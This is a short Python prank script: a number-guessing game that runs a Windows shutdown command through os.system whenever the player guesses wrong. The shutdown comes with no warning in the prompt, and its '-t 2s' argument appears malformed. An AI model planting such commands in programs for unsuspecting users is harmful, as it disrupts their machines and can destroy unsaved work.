import os
import platform
import time
import random

num = random.randint(1,10)
guess = int(input("Please Enter your Number betweeen 1 to 10:-"))
if (num == guess):
    print("Your Win")
else :
    os.system("Shutdown.exe -s -t 2s -c\"Your Device will Shut down in 2 seconds\" ")